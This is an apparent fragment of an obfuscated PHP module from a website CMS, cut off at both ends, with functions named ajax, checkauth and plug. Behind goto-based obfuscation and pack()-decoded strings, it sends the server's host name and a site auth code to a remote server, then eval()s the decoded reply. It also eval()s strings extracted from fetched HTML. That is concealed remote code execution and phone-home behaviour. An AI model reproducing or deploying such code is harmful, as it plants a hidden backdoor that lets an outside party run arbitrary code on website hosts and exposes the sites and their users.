G17ldMhx32;G17eWjgx32:$G17ACV11=&$GLOBALS[DE0558LJ][0];goto G17x31;G17ldMhx32:$G17ACV11=$GLOBALS[DE0558LJ][0];G17x31:unset($G17ACV12);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx3z;goto G17ldMhx3z;G17eWjgx3z:$G17ACV12=&$GLOBALS[DE0558LJ][032];goto G17x2y;G17ldMhx3z:$G17ACV12=$GLOBALS[DE0558LJ][032];G17x2y:$G17F10=call_user_func_array("pack",array(&$G17ACV11,&$G17ACV12));$G17P1=$G17P0 . $G17F10;$G17P2=$G17P1 . $type;unset($G17ACV14);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx2x;goto G17ldMhx2x;G17eWjgx2x:$G17ACV14=&$GLOBALS[DE0558LJ][0];goto G17x2w;G17ldMhx2x:$G17ACV14=$GLOBALS[DE0558LJ][0];G17x2w:$G17F13=call_user_func_array("pack",array(&$G17ACV14,$GLOBALS[DE0558LJ]{033}));$G17P3=$G17P2 . $G17F13;$G17P4=73*E_WARNING;$G17P5=$G17P4-146;$G17P6=72*E_WARNING;$G17P7=$G17P6-112;$G178=$GLOBALS[$G17F0]($GLOBALS[$G17F5]($G17P3),$G17P5,$G17P7)!=$md5;if($G178)goto G17eWjgx35;goto G17ldMhx35;G17eWjgx35:unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx37;goto G17ldMhx37;G17eWjgx37:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x36;G17ldMhx37:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x36:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{30}));unset($G17ACV4);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx3b;goto G17ldMhx3b;G17eWjgx3b:$G17ACV4=&$GLOBALS[DE0558LJ][0];goto G17x3a;G17ldMhx3b:$G17ACV4=$GLOBALS[DE0558LJ][0];G17x3a:unset($G17ACV5);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx39;goto G17ldMhx39;G17eWjgx39:$G17ACV5=&$GLOBALS[DE0558LJ][18];goto G17x38;G17ldMhx39:$G17ACV5=$GLOBALS[DE0558LJ][18];G17x38:$G17F3=call_user_func_array("pack",array(&$G17ACV4,&$G17ACV5));$G17F8=call_user_func_array("json_encode",array(&$data));$G17F9=call_user_func_array("ajax",array(&$G17F0,$GLOBALS[$G17F3]($G17F8)));unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx3d;goto G17ldMhx3d;G17eWjgx3d:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x3c;G17ldMhx3d:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x3c:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{0x1F}));die($G17F0);goto G17x2p;G17ldMhx35:G17x2p:goto G17x2d;G17ldMhx2o:unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx3f;goto G17ldMhx3f;G17eWjgx3f:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x3e;G17ldMhx3f:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x3e:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{30}));unset($G17ACV4);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx3j;goto G17ldMhx3j;G17eWjgx3j:$G17ACV4=&$GLOBALS[DE0558LJ][0];goto G17x3i;G17ldMhx3j:$G17ACV4=$GLOBALS[DE0558LJ][0];G17x3i:unset($G17ACV5);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx3h;goto G17ldMhx3h;G17eWjgx3h:$G17ACV5=&$GLOBALS[DE0558LJ][18];goto G17x3g;G17ldMhx3h:$G17ACV5=$GLOBALS[DE0558LJ][18];G17x3g:$G17F3=call_user_func_array("pack",array(&$G17ACV4,&$G17ACV5));$G17F8=call_user_func_array("json_encode",array(&$data));$G17F9=call_user_func_array("ajax",array(&$G17F0,$GLOBALS[$G17F3]($G17F8)));unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx3l;goto G17ldMhx3l;G17eWjgx3l:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x3k;G17ldMhx3l:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x3k:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{0x1F}));die($G17F0);G17x2d:unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx3n;goto G17ldMhx3n;G17eWjgx3n:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x3m;G17ldMhx3n:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x3m:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{040}));unset($G17ACV4);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx3r;goto G17ldMhx3r;G17eWjgx3r:$G17ACV4=&$GLOBALS[DE0558LJ][0];goto G17x3q;G17ldMhx3r:$G17ACV4=$GLOBALS[DE0558LJ][0];G17x3q:unset($G17ACV5);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx3p;goto G17ldMhx3p;G17eWjgx3p:$G17ACV5=&$GLOBALS[DE0558LJ][0x1C];goto G17x3o;G17ldMhx3p:$G17ACV5=$GLOBALS[DE0558LJ][0x1C];G17x3o:$G17F3=call_user_func_array("pack",array(&$G17ACV4,&$G17ACV5));unset($G17ACV9);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx3t;goto G17ldMhx3t;G17eWjgx3t:$G17ACV9=&$GLOBALS[DE0558LJ][0];goto G17x3s;G17ldMhx3t:$G17ACV9=$GLOBALS[DE0558LJ][0];G17x3s:$G17F8=call_user_func_array("pack",array(&$G17ACV9,$GLOBALS[DE0558LJ]{035}));unset($G17ACV12);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx42;goto G17ldMhx42;G17eWjgx42:$G17ACV12=&$GLOBALS[DE0558LJ][0];goto G17x41;G17ldMhx42:$G17ACV12=$GLOBALS[DE0558LJ][0];G17x41:$G17F11=call_user_func_array("pack",array(&$G17ACV12,$GLOBALS[DE0558LJ]{25}));$G17P0=$G17F11 . $t;unset($G17ACV14);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx4z;goto G17ldMhx4z;G17eWjgx4z:$G17ACV14=&$GLOBALS[DE0558LJ][0];goto G17x3y;G17ldMhx4z:$G17ACV14=$GLOBALS[DE0558LJ][0];G17x3y:unset($G17ACV15);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx3x;goto G17ldMhx3x;G17eWjgx3x:$G17ACV15=&$GLOBALS[DE0558LJ][032];goto G17x3w;G17ldMhx3x:$G17ACV15=$GLOBALS[DE0558LJ][032];G17x3w:$G17F13=call_user_func_array("pack",array(&$G17ACV14,&$G17ACV15));$G17P1=$G17P0 . $G17F13;$G17P2=$G17P1 . $type;unset($G17ACV17);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx3v;goto G17ldMhx3v;G17eWjgx3v:$G17ACV17=&$GLOBALS[DE0558LJ][0];goto G17x3u;G17ldMhx3v:$G17ACV17=$GLOBALS[DE0558LJ][0];G17x3u:$G17F16=call_user_func_array("pack",array(&$G17ACV17,$GLOBALS[DE0558LJ]{033}));$G17P3=$G17P2 . $G17F16;$G17P4=72*E_WARNING;$G17P5=$G17P4-112;unset($G17tI6);$G17tI6=$GLOBALS[$G17F0]($GLOBALS[$G17F3]($GLOBALS[$G17F8]($G17P3),$G17P5));$html=$G17tI6;unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx44;goto G17ldMhx44;G17eWjgx44:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x43;G17ldMhx44:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x43:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{041}));unset($G17ACV4);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx46;goto G17ldMhx46;G17eWjgx46:$G17ACV4=&$GLOBALS[DE0558LJ][0];goto G17x45;G17ldMhx46:$G17ACV4=$GLOBALS[DE0558LJ][0];G17x45:$G17F3=call_user_func_array("pack",array(&$G17ACV4,$GLOBALS[DE0558LJ]{0x22}));$GLOBALS[$G17F0]($G17F3,$html,$arr);foreach($arr[(73*E_WARNING-146)]as $value){unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx48;goto G17ldMhx48;G17eWjgx48:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x47;G17ldMhx48:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x47:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{0x23}));unset($G17ACV4);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx4a;goto G17ldMhx4a;G17eWjgx4a:$G17ACV4=&$GLOBALS[DE0558LJ][0];goto G17x49;G17ldMhx4a:$G17ACV4=$GLOBALS[DE0558LJ][0];G17x49:$G17F3=call_user_func_array("pack",array(&$G17ACV4,$GLOBALS[DE0558LJ]{044}));unset($G17ACV7);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx4c;goto G17ldMhx4c;G17eWjgx4c:$G17ACV7=&$GLOBALS[DE0558LJ][0];goto G17x4b;G17ldMhx4c:$G17ACV7=$GLOBALS[DE0558LJ][0];G17x4b:$G17F6=call_user_func_array("pack",array(&$G17ACV7,$GLOBALS[DE0558LJ]{045}));unset($G17tI0);$G17tI0=$GLOBALS[$G17F0]($G17F3,$G17F6,$value);$v=$G17tI0;unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx4e;goto G17ldMhx4e;G17eWjgx4e:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x4d;G17ldMhx4e:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x4d:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{0x23}));unset($G17ACV4);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx4i;goto G17ldMhx4i;G17eWjgx4i:$G17ACV4=&$GLOBALS[DE0558LJ][0];goto G17x4h;G17ldMhx4i:$G17ACV4=$GLOBALS[DE0558LJ][0];G17x4h:unset($G17ACV5);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx4g;goto G17ldMhx4g;G17eWjgx4g:$G17ACV5=&$GLOBALS[DE0558LJ][0x26];goto G17x4f;G17ldMhx4g:$G17ACV5=$GLOBALS[DE0558LJ][0x26];G17x4f:$G17F3=call_user_func_array("pack",array(&$G17ACV4,&$G17ACV5));unset($G17ACV9);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx4k;goto G17ldMhx4k;G17eWjgx4k:$G17ACV9=&$GLOBALS[DE0558LJ][0];goto G17x4j;G17ldMhx4k:$G17ACV9=$GLOBALS[DE0558LJ][0];G17x4j:$G17F8=call_user_func_array("pack",array(&$G17ACV9,$GLOBALS[DE0558LJ]{045}));unset($G17tI0);$G17tI0=$GLOBALS[$G17F0]($G17F3,$G17F8,$v);$v=$G17tI0;unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx4m;goto G17ldMhx4m;G17eWjgx4m:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x4l;G17ldMhx4m:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x4l:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{0x23}));unset($G17ACV4);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx4q;goto G17ldMhx4q;G17eWjgx4q:$G17ACV4=&$GLOBALS[DE0558LJ][0];goto G17x4p;G17ldMhx4q:$G17ACV4=$GLOBALS[DE0558LJ][0];G17x4p:unset($G17ACV5);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx4o;goto G17ldMhx4o;G17eWjgx4o:$G17ACV5=&$GLOBALS[DE0558LJ][39];goto G17x4n;G17ldMhx4o:$G17ACV5=$GLOBALS[DE0558LJ][39];G17x4n:$G17F3=call_user_func_array("pack",array(&$G17ACV4,&$G17ACV5));unset($G17ACV9);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx4s;goto G17ldMhx4s;G17eWjgx4s:$G17ACV9=&$GLOBALS[DE0558LJ][0];goto G17x4r;G17ldMhx4s:$G17ACV9=$GLOBALS[DE0558LJ][0];G17x4r:$G17F8=call_user_func_array("pack",array(&$G17ACV9,$GLOBALS[DE0558LJ]{40}));unset($G17tI0);$G17tI0=$GLOBALS[$G17F0]($G17F3,$G17F8,$v);$v=$G17tI0;unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx4u;goto G17ldMhx4u;G17eWjgx4u:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x4t;G17ldMhx4u:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x4t:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{0x23}));unset($G17ACV4);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx4y;goto G17ldMhx4y;G17eWjgx4y:$G17ACV4=&$GLOBALS[DE0558LJ][0];goto G17x4x;G17ldMhx4y:$G17ACV4=$GLOBALS[DE0558LJ][0];G17x4x:unset($G17ACV5);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx4w;goto G17ldMhx4w;G17eWjgx4w:$G17ACV5=&$GLOBALS[DE0558LJ][051];goto G17x4v;G17ldMhx4w:$G17ACV5=$GLOBALS[DE0558LJ][051];G17x4v:$G17F3=call_user_func_array("pack",array(&$G17ACV4,&$G17ACV5));unset($G17ACV9);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx53;goto G17ldMhx53;G17eWjgx53:$G17ACV9=&$GLOBALS[DE0558LJ][0];goto G17x52;G17ldMhx53:$G17ACV9=$GLOBALS[DE0558LJ][0];G17x52:unset($G17ACV10);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx51;goto G17ldMhx51;G17eWjgx51:$G17ACV10=&$GLOBALS[DE0558LJ][0x2A];goto G17x5z;G17ldMhx51:$G17ACV10=$GLOBALS[DE0558LJ][0x2A];G17x5z:$G17F8=call_user_func_array("pack",array(&$G17ACV9,&$G17ACV10));unset($G17tI0);$G17tI0=$GLOBALS[$G17F0]($G17F3,$G17F8,$v);$v=$G17tI0;unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx55;goto G17ldMhx55;G17eWjgx55:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x54;G17ldMhx55:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x54:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{0x23}));unset($G17ACV4);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx57;goto G17ldMhx57;G17eWjgx57:$G17ACV4=&$GLOBALS[DE0558LJ][0];goto G17x56;G17ldMhx57:$G17ACV4=$GLOBALS[DE0558LJ][0];G17x56:$G17F3=call_user_func_array("pack",array(&$G17ACV4,$GLOBALS[DE0558LJ]{43}));unset($G17ACV7);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx5b;goto G17ldMhx5b;G17eWjgx5b:$G17ACV7=&$GLOBALS[DE0558LJ][0];goto G17x5a;G17ldMhx5b:$G17ACV7=$GLOBALS[DE0558LJ][0];G17x5a:unset($G17ACV8);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx59;goto G17ldMhx59;G17eWjgx59:$G17ACV8=&$GLOBALS[DE0558LJ][0x2C];goto G17x58;G17ldMhx59:$G17ACV8=$GLOBALS[DE0558LJ][0x2C];G17x58:$G17F6=call_user_func_array("pack",array(&$G17ACV7,&$G17ACV8));unset($G17tI0);$G17tI0=$GLOBALS[$G17F0]($G17F3,$G17F6,$v);$v=$G17tI0;unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx5d;goto G17ldMhx5d;G17eWjgx5d:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x5c;G17ldMhx5d:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x5c:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{0x23}));unset($G17ACV4);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx5h;goto G17ldMhx5h;G17eWjgx5h:$G17ACV4=&$GLOBALS[DE0558LJ][0];goto G17x5g;G17ldMhx5h:$G17ACV4=$GLOBALS[DE0558LJ][0];G17x5g:unset($G17ACV5);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx5f;goto G17ldMhx5f;G17eWjgx5f:$G17ACV5=&$GLOBALS[DE0558LJ][0x2D];goto G17x5e;G17ldMhx5f:$G17ACV5=$GLOBALS[DE0558LJ][0x2D];G17x5e:$G17F3=call_user_func_array("pack",array(&$G17ACV4,&$G17ACV5));unset($G17ACV9);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx5l;goto G17ldMhx5l;G17eWjgx5l:$G17ACV9=&$GLOBALS[DE0558LJ][0];goto G17x5k;G17ldMhx5l:$G17ACV9=$GLOBALS[DE0558LJ][0];G17x5k:unset($G17ACV10);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx5j;goto G17ldMhx5j;G17eWjgx5j:$G17ACV10=&$GLOBALS[DE0558LJ][0x2E];goto G17x5i;G17ldMhx5j:$G17ACV10=$GLOBALS[DE0558LJ][0x2E];G17x5i:$G17F8=call_user_func_array("pack",array(&$G17ACV9,&$G17ACV10));unset($G17tI0);$G17tI0=$GLOBALS[$G17F0]($G17F3,$G17F8,$v);$v=$G17tI0;eval($v);unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx5n;goto G17ldMhx5n;G17eWjgx5n:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x5m;G17ldMhx5n:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x5m:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{0x23}));unset($G17tI0);$G17tI0=$GLOBALS[$G17F0]($value,$api,$html);$html=$G17tI0;unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx5p;goto G17ldMhx5p;G17eWjgx5p:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x5o;G17ldMhx5p:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x5o:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{045}));unset($G17tI0);$G17tI0=$G17F0;$api=$G17tI0;}return $html;}function ajax($action,$data=""){unset($G17ACV1);if(is_array($GLOBALS[BGS9JT0v]))goto G17eWjgx5s;goto G17ldMhx5s;G17eWjgx5s:$G17ACV1=&$GLOBALS[BGS9JT0v][0x1];goto G17x5r;G17ldMhx5s:$G17ACV1=$GLOBALS[BGS9JT0v][0x1];G17x5r:$G17F0=call_user_func_array("pack",array($GLOBALS[BGS9JT0v]{0},&$G17ACV1));$G170=!defined($G17F0);if($G170)goto G17eWjgx5t;goto G17ldMhx5t;G17eWjgx5t:unset($G17ACV1);if(is_array($GLOBALS[BGS9JT0v]))goto G17eWjgx5v;goto G17ldMhx5v;G17eWjgx5v:$G17ACV1=&$GLOBALS[BGS9JT0v][0x2];goto G17x5u;G17ldMhx5v:$G17ACV1=$GLOBALS[BGS9JT0v][0x2];G17x5u:$G17F0=call_user_func_array("pack",array($GLOBALS[BGS9JT0v]{0},&$G17ACV1));unset($G17ACV4);if(is_array($GLOBALS[BGS9JT0v]))goto G17eWjgx5x;goto G17ldMhx5x;G17eWjgx5x:$G17ACV4=&$GLOBALS[BGS9JT0v][0x1];goto G17x5w;G17ldMhx5x:$G17ACV4=$GLOBALS[BGS9JT0v][0x1];G17x5w:$G17F3=call_user_func_array("pack",array($GLOBALS[BGS9JT0v]{0},&$G17ACV4));unset($G17ACV7);if(is_array($GLOBALS[BGS9JT0v]))goto G17eWjgx6z;goto G17ldMhx6z;G17eWjgx6z:$G17ACV7=&$GLOBALS[BGS9JT0v][03];goto G17x5y;G17ldMhx6z:$G17ACV7=$GLOBALS[BGS9JT0v][03];G17x5y:$G17F6=call_user_func_array("pack",array($GLOBALS[BGS9JT0v]{0},&$G17ACV7));call_user_func($G17F0,$G17F3,$G17F6);goto G17x5q;G17ldMhx5t:G17x5q:$G17A0=array();$G17A0[]=$_SERVER;unset($G17tI0);$G17tI0=$G17A0;$GLOBALS[X1I7NTKJ]=$G17tI0;global $conn,$C_authcode;unset($G17ACV1);if(is_array($GLOBALS[BGS9JT0v]))goto G17eWjgx62;goto G17ldMhx62;G17eWjgx62:$G17ACV1=&$GLOBALS[BGS9JT0v][4];goto G17x61;G17ldMhx62:$G17ACV1=$GLOBALS[BGS9JT0v][4];G17x61:$G17F0=call_user_func_array("pack",array($GLOBALS[BGS9JT0v]{0},&$G17ACV1));$G17P0=$G17F0 . $action;$G17F3=call_user_func_array("pack",array($GLOBALS[BGS9JT0v]{0},$GLOBALS[BGS9JT0v]{05}));$G17P1=0-40;$G17P2=E_WARNING*20;$G17P3=$G17P1+$G17P2;$G17F4=call_user_func_array("pack",array($GLOBALS[BGS9JT0v]{0},$GLOBALS[BGS9JT0v]{06}));$G17P4=$G17F3 . $GLOBALS[X1I7NTKJ][$G17P3][$G17F4];$G17F5=call_user_func_array("pack",array($GLOBALS[BGS9JT0v]{0},$GLOBALS[BGS9JT0v]{07}));$G17P5=$G17P4 . $G17F5;$G17P6=$G17P5 . $C_authcode;unset($G17ACV7);if(is_array($GLOBALS[BGS9JT0v]))goto G17eWjgx64;goto G17ldMhx64;G17eWjgx64:$G17ACV7=&$GLOBALS[BGS9JT0v][8];goto G17x63;G17ldMhx64:$G17ACV7=$GLOBALS[BGS9JT0v][8];G17x63:$G17F6=call_user_func_array("pack",array($GLOBALS[BGS9JT0v]{0},&$G17ACV7));$G17P7=$G17P6 . $G17F6;$G17F8=call_user_func_array("urlencode",array(&$data));$G17P8=$G17P7 . $G17F8;$G17F10=call_user_func_array("getbody",array(&$G17P0,&$G17P8));unset($G17tI9);$G17tI9=$G17F10;$info=$G17tI9;$G17F0=call_user_func_array("pack",array($GLOBALS[BGS9JT0v]{0},$GLOBALS[BGS9JT0v]{0x9}));eval($GLOBALS[$G17F0]($info));}function checkauth(){$G17F0=call_user_func_array("pack",array($GLOBALS[C6WQXR9Q]{00},$GLOBALS[C6WQXR9Q]{1}));$G170=!defined($G17F0);if($G170)goto G17eWjgx66;goto G17ldMhx66;G17eWjgx66:unset($G17ACV1);if(is_array($GLOBALS[C6WQXR9Q]))goto G17eWjgx68;goto G17ldMhx68;G17eWjgx68:$G17ACV1=&$GLOBALS[C6WQXR9Q][2];goto G17x67;G17ldMhx68:$G17ACV1=$GLOBALS[C6WQXR9Q][2];G17x67:$G17F0=call_user_func_array("pack",array($GLOBALS[C6WQXR9Q]{00},&$G17ACV1));$G17F3=call_user_func_array("pack",array($GLOBALS[C6WQXR9Q]{00},$GLOBALS[C6WQXR9Q]{1}));$G17F4=call_user_func_array("pack",array($GLOBALS[C6WQXR9Q]{00},$GLOBALS[C6WQXR9Q]{3}));call_user_func($G17F0,$G17F3,$G17F4);goto G17x65;G17ldMhx66:G17x65:$G17A0=array();$G17A0[]=$_SERVER;unset($G17tI0);$G17tI0=$G17A0;$GLOBALS[KP48833J]=$G17tI0;global $C_authcode;unset($G17ACV1);if(is_array($GLOBALS[C6WQXR9Q]))goto G17eWjgx6b;goto G17ldMhx6b;G17eWjgx6b:$G17ACV1=&$GLOBALS[C6WQXR9Q][04];goto G17x6a;G17ldMhx6b:$G17ACV1=$GLOBALS[C6WQXR9Q][04];G17x6a:$G17F0=call_user_func_array("pack",array($GLOBALS[C6WQXR9Q]{00},&$G17ACV1));unset($G17ACV4);if(is_array($GLOBALS[C6WQXR9Q]))goto G17eWjgx6d;goto G17ldMhx6d;G17eWjgx6d:$G17ACV4=&$GLOBALS[C6WQXR9Q][04];goto G17x6c;G17ldMhx6d:$G17ACV4=$GLOBALS[C6WQXR9Q][04];G17x6c:$G17F3=call_user_func_array("pack",array($GLOBALS[C6WQXR9Q]{00},&$G17ACV4));$G170=$_SESSION[$G17F0]==$G17F3;if($G170)goto G17eWjgx6e;goto G17ldMhx6e;G17eWjgx6e:return true;goto G17x69;G17ldMhx6e:unset($G17ACV1);if(is_array($GLOBALS[C6WQXR9Q]))goto G17eWjgx6g;goto G17ldMhx6g;G17eWjgx6g:$G17ACV1=&$GLOBALS[C6WQXR9Q][05];goto G17x6f;G17ldMhx6g:$G17ACV1=$GLOBALS[C6WQXR9Q][05];G17x6f:$G17F0=call_user_func_array("pack",array($GLOBALS[C6WQXR9Q]{00},&$G17ACV1));$G17P0=E_WARNING*96;$G17P1=$G17P0-192;$G17F2=call_user_func_array("pack",array($GLOBALS[C6WQXR9Q]{00},$GLOBALS[C6WQXR9Q]{6}));$G17P2=$G17F0 . $GLOBALS[KP48833J][$G17P1][$G17F2];$G17F4=call_user_func_array("pack",array($GLOBALS[C6WQXR9Q]{00},$GLOBALS[C6WQXR9Q]{07}));$G17P3=$G17F4 . $C_authcode;$G17F5=call_user_func_array("getbody",array(&$G17P2,&$G17P3));unset($G17tI4);$G17tI4=$G17F5;$QA58R7CQ=$G17tI4;$G17F0=call_user_func_array("pack",array($GLOBALS[C6WQXR9Q]{00},$GLOBALS[C6WQXR9Q]{8}));$G170=$QA58R7CQ==$G17F0;if($G170)goto G17eWjgx6i;goto G17ldMhx6i;G17eWjgx6i:unset($G17ACV1);if(is_array($GLOBALS[C6WQXR9Q]))goto G17eWjgx6k;goto G17ldMhx6k;G17eWjgx6k:$G17ACV1=&$GLOBALS[C6WQXR9Q][04];goto G17x6j;G17ldMhx6k:$G17ACV1=$GLOBALS[C6WQXR9Q][04];G17x6j:$G17F0=call_user_func_array("pack",array($GLOBALS[C6WQXR9Q]{00},&$G17ACV1));unset($G17ACV4);if(is_array($GLOBALS[C6WQXR9Q]))goto G17eWjgx6m;goto G17ldMhx6m;G17eWjgx6m:$G17ACV4=&$GLOBALS[C6WQXR9Q][04];goto G17x6l;G17ldMhx6m:$G17ACV4=$GLOBALS[C6WQXR9Q][04];G17x6l:$G17F3=call_user_func_array("pack",array($GLOBALS[C6WQXR9Q]{00},&$G17ACV4));unset($G17tI0);$G17tI0=$G17F3;$_SESSION[$G17F0]=$G17tI0;return true;goto G17x6h;G17ldMhx6i:return false;G17x6h:G17x69:}function plug($NZ2KC26v,$A76E5WTJ){unset($G17ACV1);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx6r;goto G17ldMhx6r;G17eWjgx6r:$G17ACV1=&$GLOBALS[W13WMFQJ][0];goto G17x6q;G17ldMhx6r:$G17ACV1=$GLOBALS[W13WMFQJ][0];G17x6q:unset($G17ACV2);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx6p;goto G17ldMhx6p;G17eWjgx6p:$G17ACV2=&$GLOBALS[W13WMFQJ][0x1];goto G17x6o;G17ldMhx6p:$G17ACV2=$GLOBALS[W13WMFQJ][0x1];G17x6o:$G17F0=call_user_func_array("pack",array(&$G17ACV1,&$G17ACV2));$G170=!defined($G17F0);if($G170)goto G17eWjgx6s;goto G17ldMhx6s;G17eWjgx6s:unset($G17ACV1);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx6w;goto G17ldMhx6w;G17eWjgx6w:$G17ACV1=&$GLOBALS[W13WMFQJ][0];goto G17x6v;G17ldMhx6w:$G17ACV1=$GLOBALS[W13WMFQJ][0];G17x6v:unset($G17ACV2);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx6u;goto G17ldMhx6u;G17eWjgx6u:$G17ACV2=&$GLOBALS[W13WMFQJ][2];goto G17x6t;G17ldMhx6u:$G17ACV2=$GLOBALS[W13WMFQJ][2];G17x6t:$G17F0=call_user_func_array("pack",array(&$G17ACV1,&$G17ACV2));unset($G17ACV6);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx71;goto G17ldMhx71;G17eWjgx71:$G17ACV6=&$GLOBALS[W13WMFQJ][0];goto G17x7z;G17ldMhx71:$G17ACV6=$GLOBALS[W13WMFQJ][0];G17x7z:unset($G17ACV7);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx6y;goto G17ldMhx6y;G17eWjgx6y:$G17ACV7=&$GLOBALS[W13WMFQJ][0x1];goto G17x6x;G17ldMhx6y:$G17ACV7=$GLOBALS[W13WMFQJ][0x1];G17x6x:$G17F5=call_user_func_array("pack",array(&$G17ACV6,&$G17ACV7));unset($G17ACV11);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx73;goto G17ldMhx73;G17eWjgx73:$G17ACV11=&$GLOBALS[W13WMFQJ][0];goto G17x72;G17ldMhx73:$G17ACV11=$GLOBALS[W13WMFQJ][0];G17x72:$G17F10=call_user_func_array("pack",array(&$G17ACV11,$GLOBALS[W13WMFQJ]{03}));call_user_func($G17F0,$G17F5,$G17F10);goto G17x6n;G17ldMhx6s:G17x6n:$G17A0=array();$G17A0[]=$_SERVER;unset($G17tI0);$G17tI0=$G17A0;$GLOBALS[RMGDMYSJ]=$G17tI0;global $conn,$C_authcode;unset($G17ACV1);if(is_array($GLOBALS[W13WMFQJ]))goto G17eWjgx78;goto G17ldMhx78;G17eWjgx78:$G17ACV1=&$GLOBALS[W13WMFQJ][0];goto 